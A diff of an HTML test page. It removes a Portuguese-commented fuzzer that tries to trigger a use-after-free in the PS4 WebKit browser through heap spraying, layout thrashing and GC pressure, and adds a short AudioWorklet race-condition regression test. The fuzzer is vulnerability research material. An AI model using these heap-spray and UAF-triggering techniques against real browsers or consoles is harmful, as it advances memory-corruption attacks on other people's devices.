@@ -1,257 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Teste de Regress�o: Condi��o de corrida em AudioWorkletGlobalScope</title>
+</head>
+<body>
+<div id="status">Executando teste...</div>
 
-<style>
-  iframe {
-    content: url();
-    zoom: 0.01;
-  }
-</style>
 <script>
-  // ── 1. Crash detection via sessionStorage ─────────────────────────────────
-  // Se o PS4 crashar e recarregar a página, estado.ciclo > 0
-  // e sabemos exatamente qual config estava ativa no momento do crash
-  const CHAVE = 'uaf_ps4';
-  const estado = JSON.parse(
-    sessionStorage.getItem(CHAVE) || '{"ciclo":0,"crashes":0,"ultimaCfg":""}'
-  );
-  if (estado.ciclo > 0) {
-    console.log('[CRASH?] reload detectado no ciclo ' + estado.ciclo);
-    console.log('[CRASH?] config ativa: ' + estado.ultimaCfg);
-    estado.crashes++;
-  }
+// Fun��o utilit�ria de GC via aloca��o recursiva de mem�ria
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
+    }
+    for (var i = 0; i < 1000; i++)
+        gcRec(10);
+}
 
-  // ── 2. Scan de APIs PS4-específicas (uma vez na inicialização) ─────────────
-  const ps4Apis = Object.getOwnPropertyNames(window)
-    .filter(k => /sce|orbis|ps4|webkit/i.test(k) && k !== 'WebKitMutationObserver');
-  if (ps4Apis.length)
-    console.log('[PS4] APIs detectadas em window:', ps4Apis.join(', '));
-  if (window.internals)
-    console.log('[PS4] window.internals DISPONÍVEL — firmware com test build!');
-  if (window.testRunner)
-    console.log('[PS4] window.testRunner DISPONÍVEL');
-
-  // ── Estado ────────────────────────────────────────────────────────────────
-  let ciclo = estado.ciclo;
-  const MAX_CICLOS = 300;
-  const SIZE_CLASSES = [0x100, 0x140, 0x180, 0x1c0, 0x200, 0x240, 0x280];
-  let _spray = null;
-  const anomalias = [];
-
-  // ── 3. Padrões de spray rotacionados ─────────────────────────────────────
-  // Padrão diferente a cada bloco de SIZE_CLASSES.length ciclos
-  // Se o ponteiro dangling for lido como int, valor diferente = crash diferente
-  const PADROES = [
-    sz => { const ab = new ArrayBuffer(sz); new Uint32Array(ab).fill(0x41414141); return ab; },
-    sz => { const ab = new ArrayBuffer(sz); new Uint32Array(ab).fill(0xdeadbeef); return ab; },
-    sz => { const ab = new ArrayBuffer(sz); new Uint32Array(ab).fill(0x00000000); return ab; },
-    sz => { const ab = new ArrayBuffer(sz); new Uint32Array(ab).fill(0xffffffff); return ab; },
-  ];
-
-  function fazerSpray(sz) {
-    _spray = null; // libera anterior → GC → slot disponível para reuse
-    const p = PADROES[Math.floor(ciclo / SIZE_CLASSES.length) % PADROES.length];
-    const buf = [];
-    for (let i = 0; i < 512; i++) buf.push(p(sz));
-    _spray = buf; // mantém vivo até próxima chamada
-  }
-
-  // ── 4. Estratégias — rotacionam a cada ciclo ──────────────────────────────
-  const EST = [
-
-    // A: baseline — só spray, sem pressão extra
-    { label: 'A-baseline',
-      pre: () => {}, post: () => {} },
-
-    // B: layout thrashing — força sync layout repetido antes do hash change
-    // Objetivo: aumentar chance de layout() destruir RenderWidget durante spray
-    { label: 'B-layout-thrash',
-      pre: () => {
-        for (let i = 0; i < 8; i++) {
-          document.documentElement.style.outline = i + 'px solid red';
-          void i0.offsetWidth; // força layout síncrono
+// M�dulo de processamento m�nimo para o AudioWorklet
+const workletCode = `
+    class TestProcessor extends AudioWorkletProcessor {
+        process(inputs, outputs, parameters) {
+            return true;
         }
-        document.documentElement.style.outline = '';
-      },
-      post: () => {} },
+    }
+    registerProcessor('test-processor', TestProcessor);
+`;
 
-    // C: zoom cycle — força recriação do RenderWidget via CSS
-    // zoom diferente = RenderWidget destruído e reconstruído = slot liberado
-    { label: 'C-zoom-cycle',
-      pre: () => {
-        i0.style.zoom = '0.02'; void i0.offsetWidth;
-        i0.style.zoom = '0.005'; void i0.offsetWidth;
-        i0.style.zoom = '0.01'; // restaura para não quebrar o loop
-      },
-      post: () => {} },
+const workletBlobUrl = URL.createObjectURL(new Blob([workletCode], { type: "application/javascript" }));
 
-    // D: content url cycle — destrói e recria RenderWidget diretamente
-    // content: url(X) → X diferente = RenderWidget completamente novo
-    { label: 'D-content-cycle',
-      pre: () => {
-        i0.style.content = 'url(about:blank)'; void i0.offsetWidth;
-        i0.style.content = 'url()';            void i0.offsetWidth;
-      },
-      post: () => {} },
+async function runAudioWorkletTest() {
+    if (!window.AudioContext || !window.AudioWorkletNode) {
+        document.getElementById("status").innerText = "PASS: AudioWorklet n�o suportado neste ambiente.";
+        return;
+    }
 
-    // E: selection span — traversal alternativo da render tree
-    // getClientRects() numa Range que abrange o root força WebKit a percorrer
-    // a render tree para calcular geometria — caminho diferente do write()
-    { label: 'E-selection-traversal',
-      pre: () => {
+    for (let cycle = 0; cycle < 30; cycle++) {
+        // 1. Cria um AudioContext
+        const ctx = new AudioContext();
+
+        // 2. Inicia o carregamento do m�dulo na worklet thread
+        const modulePromise = ctx.audioWorklet.addModule(workletBlobUrl);
+
+        // 3. For�a a Audio Rendering Thread a rodar renderQuantum antes da conclus�o do worklet
+        const osc = ctx.createOscillator();
+        osc.connect(ctx.destination);
+        osc.start();
+
+        await modulePromise.catch(() => {});
+
         try {
-          const sel = window.getSelection();
-          sel.removeAllRanges();
-          const r = document.createRange();
-          r.selectNodeContents(document.documentElement);
-          sel.addRange(r);
-          void document.documentElement.offsetWidth;
-          sel.removeAllRanges();
-        } catch(e) {}
-      },
-      post: () => {} },
+            // 4. Cria o n� que acopla o worklet ao pipeline de renderiza��o
+            const node = new AudioWorkletNode(ctx, "test-processor");
+            node.connect(ctx.destination);
+        } catch (e) {}
 
-    // F: GC pressure — libera ~50MB para forçar GC durante a janela UAF
-    // Objetivo: fazer o alocador reusar o slot do RenderWidget liberado
-    // exatamente quando o spray está ativo
-    { label: 'F-gc-pressure',
-      pre: () => {
-        const tmp = [];
-        for (let i = 0; i < 50; i++) tmp.push(new ArrayBuffer(1024 * 1024));
-        // tmp sai de escopo → GC imediato → slots liberados
-      },
-      post: () => {} },
+        // 5. Fecha e descarta o contexto imediatamente durante a inicializa��o
+        ctx.close();
 
-    // G: layout pós-hash — janela crítica imediatamente após o free()
-    // O hash change dispara o free do RenderWidget; leituras de layout
-    // logo após maximizam a chance de acessar o slot recém-liberado
-    { label: 'G-post-hash-layout',
-      pre: () => {},
-      post: () => {
-        void i0.offsetWidth;
-        void document.documentElement.offsetHeight;
-        void i0.getBoundingClientRect();
-        void i0.offsetWidth; // segunda leitura
-      } },
-
-    // H: iframes extras com tabindex=-1
-    // tabindex=-1 = não recebem foco pelo loop → não interferem
-    // Objetivo: multiplicar RenderWidget instances para aumentar pressão
-    // no layout engine e probabilidade de hit na janela UAF
-    { label: 'H-extra-renderwidgets',
-      pre: () => {
-        for (let i = 0; i < 4; i++) {
-          const f = document.createElement('iframe');
-          f.tabIndex = -1; // nunca focado pelo mecanismo do loop
-          f.style.cssText = 'content:url();zoom:0.01;position:absolute;left:-9999px';
-          f.className = '_fz';
-          document.body.appendChild(f);
+        // 6. Dispara press�o no coletor para for�ar a desaloca��o do escopo
+        if (cycle % 5 === 0) {
+            gc();
         }
-        void document.documentElement.offsetWidth;
-      },
-      post: () => {
-        // Remove após o hash change — evita acúmulo entre ciclos
-        document.querySelectorAll('._fz').forEach(f => f.remove());
-      } },
-  ];
-
-  // ── Checagem de anomalia ──────────────────────────────────────────────────
-  function checar(tag, sz, estLabel) {
-    const errs = [];
-    try {
-      const r = i0.getBoundingClientRect();
-      if (r.width === 0 && r.height === 0) errs.push('geom-zero');
-    } catch(e) { errs.push('rect:' + e.message); }
-    try { void document.documentElement.offsetHeight; }
-    catch(e) { errs.push('oh:' + e.message); }
-    try {
-      const rng = document.createRange();
-      rng.selectNode(i0);
-      rng.getClientRects();
-      rng.detach();
-    } catch(e) { errs.push('range:' + e.message); }
-    if (errs.length) {
-      const entry = { ciclo, sz: '0x' + sz.toString(16), tag, est: estLabel, err: errs };
-      anomalias.push(entry);
-      console.log('[!] ANOMALIA', JSON.stringify(entry));
-    }
-  }
-
-  function salvar(sz, est) {
-    estado.ciclo = ciclo;
-    estado.ultimaCfg = 'sz=0x' + sz.toString(16) + ' est=' + est.label +
-                       ' padrao=' + PADROES[Math.floor(ciclo / SIZE_CLASSES.length) % PADROES.length].toString().slice(49, 69);
-    sessionStorage.setItem(CHAVE, JSON.stringify(estado));
-  }
-
-  function relatorio() {
-    sessionStorage.removeItem(CHAVE);
-    console.log('[FUZZER] ══════════════════ RELATÓRIO ══════════════════');
-    console.log('[FUZZER] ciclos=' + ciclo +
-                ' | crashes=' + estado.crashes +
-                ' | anomalias=' + anomalias.length);
-
-    if (estado.crashes > 0) {
-      console.log('[FUZZER] !! CRASH DETECTADO !!');
-      console.log('[FUZZER] Config no momento do crash: ' + estado.ultimaCfg);
-      console.log('[FUZZER] → Isolar essa config e reproduzir com Remote Inspector ativo');
     }
 
-    if (anomalias.length > 0) {
-      const fSz = {}, fEst = {};
-      anomalias.forEach(a => {
-        fSz[a.sz]   = (fSz[a.sz]  || 0) + 1;
-        fEst[a.est] = (fEst[a.est]|| 0) + 1;
-      });
-      const tSz  = Object.entries(fSz).sort((a, b) => b[1] - a[1])[0];
-      const tEst = Object.entries(fEst).sort((a, b) => b[1] - a[1])[0];
-      console.log('[FUZZER] size class candidata:    ' + tSz[0]  + ' (' + tSz[1]  + 'x)');
-      console.log('[FUZZER] estratégia mais efetiva: ' + tEst[0] + ' (' + tEst[1] + 'x)');
-      console.log('[FUZZER] detalhe:', JSON.stringify(anomalias));
-    }
+    document.getElementById("status").innerText = "PASS: AudioWorklet inicializado e finalizado sem UAF / race condition.";
+}
 
-    if (!estado.crashes && !anomalias.length) {
-      console.log('[FUZZER] Sem sinal JS visível.');
-      console.log('[FUZZER] → Duas possibilidades:');
-      console.log('[FUZZER]   1. UAF ocorre em C++ puro sem reflexo em JS');
-      console.log('[FUZZER]      → Solução: Remote Inspector durante as iterações');
-      console.log('[FUZZER]      → Acionar GetRenderTreeExternalRepresentation via protocolo WebKit');
-      console.log('[FUZZER]   2. Spray não está cobrindo o tamanho real do RenderWidget');
-      console.log('[FUZZER]      → Aumentar SIZE_CLASSES para incluir 0x300 e 0x380');
-    }
-  }
-
-  // ── Loop original — intacto ───────────────────────────────────────────────
-  onload = () => {
-    document.documentElement.append(document.createElement('frameset'));
-
-    i0.onfocus = () => {
-      if (ciclo >= MAX_CICLOS) { i0.onfocus = null; relatorio(); return; }
-
-      const sz  = SIZE_CLASSES[ciclo % SIZE_CLASSES.length];
-      const est = EST[ciclo % EST.length];
-
-      salvar(sz, est);   // persiste ANTES de executar — detecta crash mid-ciclo
-      fazerSpray(sz);
-      est.pre();
-      checar('pre', sz, est.label);
-
-      location.hash = 'y';   // ← intacto
-
-      est.post();
-      fazerSpray(sz);
-      checar('post', sz, est.label);
-
-      if (ciclo % 10 === 0)
-        console.log('[FUZZER] ciclo=' + ciclo +
-                    ' sz=0x' + sz.toString(16) +
-                    ' est=' + est.label);
-      ciclo++;
-    };
-
-    location.hash = 'x';   // ← intacto
-
-    let s0 = document.createElement('script');
-    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
-    document.head.append(s0);
-  };
+runAudioWorkletTest().catch((err) => {
+    document.getElementById("status").innerText = "FAIL: " + err.message;
+});
 </script>
-<iframe id="i0"></iframe>
+</body>
+</html>
